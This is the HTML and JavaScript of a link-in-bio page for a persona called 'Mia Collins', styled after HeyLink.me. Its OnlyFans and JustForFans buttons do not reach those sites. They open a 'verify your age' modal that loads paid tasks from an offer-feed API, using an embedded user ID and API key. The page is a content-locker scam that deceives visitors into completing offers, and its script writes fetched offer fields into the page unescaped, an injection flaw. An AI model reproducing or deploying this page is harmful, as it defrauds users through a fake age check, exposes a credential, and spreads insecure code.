<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Mia Collins | Links</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
  <style>
    :root {
      --main-bg: #ffe4e9; /* Soft pink background */
      --text-color: #900c3f; /* Dark magenta text */
      --btn-bg: #f8c8d0; /* Lighter pink button */
      --modal-accent: #900c3f;
    }

    body {
      background-color: var(--main-bg);
      font-family: 'Poppins', sans-serif;
      margin: 0;
      padding: 0;
      color: var(--text-color);
      display: flex;
      flex-direction: column;
      align-items: center;
      min-height: 100vh;
    }

    /* --- TOP BAR --- */
    .top-nav {
      width: 100%;
      max-width: 450px;
      display: flex;
      justify-content: space-between;
      padding: 20px;
      box-sizing: border-box;
    }

    .top-nav svg {
      width: 28px;
      height: 28px;
      fill: var(--text-color);
      cursor: pointer;
    }

    /* --- PROFILE --- */
    .profile-section {
      text-align: center;
      margin-bottom: 30px;
    }

    .profile-img {
      width: 120px;
      height: 120px;
      border-radius: 50%;
      border: 4px solid white;
      object-fit: cover;
      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
    }

    .profile-name {
      font-size: 24px;
      font-weight: 700;
      margin-top: 15px;
    }

    /* --- BUTTONS --- */
    .links-container {
      width: 90%;
      max-width: 400px;
    }

    .link-card {
      background-color: var(--btn-bg);
      display: flex;
      align-items: center;
      padding: 12px 20px;
      margin-bottom: 15px;
      border-radius: 50px;
      text-decoration: none;
      color: var(--text-color);
      font-weight: 500;
      transition: transform 0.2s ease, box-shadow 0.2s ease;
      cursor: pointer;
      border: none;
      width: 100%;
    }

    .link-card:hover {
      transform: translateY(-2px);
      box-shadow: 0 5px 15px rgba(144, 12, 63, 0.15);
    }

    .icon-box {
      width: 40px;
      height: 40px;
      border-radius: 50%;
      background: white;
      display: flex;
      align-items: center;
      justify-content: center;
      margin-right: 15px;
    }

    .icon-box img {
      width: 24px;
      height: 24px;
    }

    .link-text {
      flex-grow: 1;
      text-align: left;
      font-size: 18px;
      text-transform: lowercase;
    }

    .share-mini {
      width: 20px;
      height: 20px;
      fill: var(--text-color);
      opacity: 0.6;
    }

    /* --- FOOTER --- */
    .footer {
      margin-top: auto;
      width: 100%;
      max-width: 450px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 20px;
      box-sizing: border-box;
      font-weight: 600;
    }

    .heylink-mark {
      display: flex;
      align-items: center;
      gap: 5px;
    }

    /* --- MODAL / POPUP --- */
    .modal-overlay {
      position: fixed;
      inset: 0;
      background: rgba(0,0,0,0.4);
      backdrop-filter: blur(4px);
      display: none;
      justify-content: center;
      align-items: center;
      z-index: 1000;
      padding: 20px;
    }

    .modal-overlay.active { display: flex; }

    .modal-box {
      background: white;
      width: 100%;
      max-width: 380px;
      border-radius: 20px;
      overflow: hidden;
      box-shadow: 0 20px 40px rgba(0,0,0,0.2);
      animation: slideUp 0.3s ease-out;
    }

    @keyframes slideUp {
      from { transform: translateY(20px); opacity: 0; }
      to { transform: translateY(0); opacity: 1; }
    }

    .modal-header {
      background: var(--modal-accent);
      color: white;
      padding: 20px;
      text-align: center;
      position: relative;
    }

    .modal-header h3 { margin: 0; font-size: 18px; letter-spacing: 1px; }

    .close-modal {
      position: absolute;
      right: 15px;
      top: 15px;
      background: none;
      border: none;
      color: white;
      font-size: 20px;
      cursor: pointer;
    }

    .modal-body {
      padding: 25px;
      text-align: center;
    }

    .modal-instruction {
      font-size: 14px;
      color: #666;
      margin-bottom: 20px;
    }

    .offer-item {
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 15px;
      border: 1px solid #eee;
      border-radius: 12px;
      margin-bottom: 10px;
      text-decoration: none;
      color: #333;
      transition: background 0.2s;
    }

    .offer-item:hover { background: #fff5f7; border-color: var(--btn-bg); }

    .offer-btn {
      background: var(--modal-accent);
      color: white;
      padding: 6px 15px;
      border-radius: 20px;
      font-size: 12px;
      font-weight: 600;
    }
  </style>
</head>
<body>

  <div class="top-nav">
    <svg viewBox="0 0 24 24"><path d="M3 3h8v8H3V3zm2 2v4h4V5H5zm8-2h8v8h-8V3zm2 2v4h4V5h-4zM3 13h8v8H3v-8zm2 2v4h4v-4H5zm13-2h3v2h-3v-2zm-3 2h3v2h-3v-2zm3 2h3v3h-3v-3zm-3 0h2v2h-2v-2zm-3-3h2v2h-2v-2zm3-3h2v2h-2v-2z"/></svg>
    <svg viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81 1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9c-1.66 0-3 1.34-3 3s1.34 3 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.16c-.05.21-.08.43-.08.65 0 1.61 1.31 2.92 2.92 2.92s2.92-1.31 2.92-2.92-1.31-2.92-2.92-2.92z"/></svg>
  </div>

  <div class="profile-section">
    <img src="https://i.ibb.co/L6vj8N0/avatar.jpg" alt="Mia Collins" class="profile-img">
    <div class="profile-name">Mia Collins</div>
  </div>

  <div class="links-container">
    <button class="link-card" onclick="openModal()">
      <div class="icon-box">
        <img src="https://cdn.worldvectorlogo.com/logos/onlyfans-2.svg" alt="OF">
      </div>
      <span class="link-text">onlyfans</span>
      <svg class="share-mini" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81 1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9c-1.66 0-3 1.34-3 3s1.34 3 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.16c-.05.21-.08.43-.08.65 0 1.61 1.31 2.92 2.92 2.92s2.92-1.31 2.92-2.92-1.31-2.92-2.92-2.92z"/></svg>
    </button>

    <button class="link-card" onclick="openModal()">
      <div class="icon-box">
        <svg viewBox="0 0 24 24" width="24" height="24"><path fill="#ff4d6d" d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg>
      </div>
      <span class="link-text">JustForFans</span>
      <svg class="share-mini" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81 1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9c-1.66 0-3 1.34-3 3s1.34 3 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.16c-.05.21-.08.43-.08.65 0 1.61 1.31 2.92 2.92 2.92s2.92-1.31 2.92-2.92-1.31-2.92-2.92-2.92z"/></svg>
    </button>
  </div>

  <div class="footer">
    <svg viewBox="0 0 24 24" width="24" height="24" fill="currentColor"><path d="M11 7h2v2h-2zm0 4h2v6h-2zm1-9C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z"/></svg>
    <div class="heylink-mark">
      <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor"><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76 0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71 0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71 0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76 0 5-2.24 5-5s-2.24-5-5-5z"/></svg>
      HeyLink.me
    </div>
  </div>

  <div id="offerModal" class="modal-overlay">
    <div class="modal-box">
      <div class="modal-header">
        <h3>PRIVATE ACCESS</h3>
        <button class="close-modal" onclick="closeModal()">✕</button>
      </div>
      <div class="modal-body">
        <p class="modal-instruction">Please complete one of the steps below to verify your age and unlock the content.</p>
        <div id="offerList">
          <p>Finding available tasks...</p>
        </div>
      </div>
    </div>
  </div>

  <script>
    const modal = document.getElementById('offerModal');
    const offerList = document.getElementById('offerList');
    const API_URL = "https://d2xohqmdyl2cj3.cloudfront.net/public/offers/feed.php?user_id=584180&api_key=ad55fcf79b3953d539938be8015c3900&s1=&s2=";

    function openModal() {
      modal.classList.add('active');
      fetchOffers();
    }

    function closeModal() {
      modal.classList.remove('active');
    }

    async function fetchOffers() {
      try {
        const response = await fetch(API_URL);
        const data = await response.json();
        if(data && data.length > 0) {
          offerList.innerHTML = data.slice(0, 3).map(offer => `
            <a href="${offer.url}" target="_blank" class="offer-item">
              <div style="text-align: left">
                <div style="font-weight: 600; font-size: 15px;">${offer.anchor}</div>
                <div style="font-size: 11px; color: #888;">Complete to unlock</div>
              </div>
              <div class="offer-btn">GO</div>
            </a>
          `).join('');
        } else {
          offerList.innerHTML = '<p>No tasks available right now. Please try again later.</p>';
        }
      } catch (e) {
        offerList.innerHTML = '<p>Error loading tasks. Please refresh.</p>';
      }
    }

    window.onclick = (e) => { if(e.target == modal) closeModal(); }
  </script>
</body>
</html>
